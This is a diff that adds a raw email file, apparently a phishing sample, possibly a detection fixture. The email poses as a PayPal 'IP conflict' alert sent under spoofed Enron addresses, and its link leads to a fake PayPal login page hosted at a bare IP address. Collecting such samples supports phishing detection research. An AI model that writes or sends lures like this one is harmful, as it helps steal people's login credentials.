@@ -1,0 +1,34 @@
+From <diane.salcido@enron.com,,test@attack.com>
+From:<diane.salcido@enron.com>
+To: jeff.dasovich@enron.com, geoff.pollard@enron.com, lamar.frazier@enron.com
+Subject: PayPal Ip Config
+Date: Wed, 13 Jan 2010 04:04:38 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <SERVERLPURuE4BykVM3000022b3@alpostinc.com>
+X-OriginalArrivalTime: 13 Jan 2010 02:04:16.0312 (UTC) FILETIME=[B5B1EB80:01CA93F4]
+Content-Length: 467
+Lines: 12
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 1285
+
+<html>
+<title>PayPal IP CONFLICT</title>
+<div align="center"><br>We noticed one or more login attempts  from a foreign IP address .
+<br>
+        <br>
+&nbsp;&nbsp; 
+	<br>
+	<br>
+    <table bgcolor="#fffecd" width="295" height="25">
+        <tbody><tr>
+          <td align="center"><font size="2" face="Arial"><a href=" http://82.115.26.23/www.paypal.com/us/cgi-bin/webscr.htm?cmd=_login-run" target="_blank"> Log In now to resolve the problem. </a></font></td>
+</html>
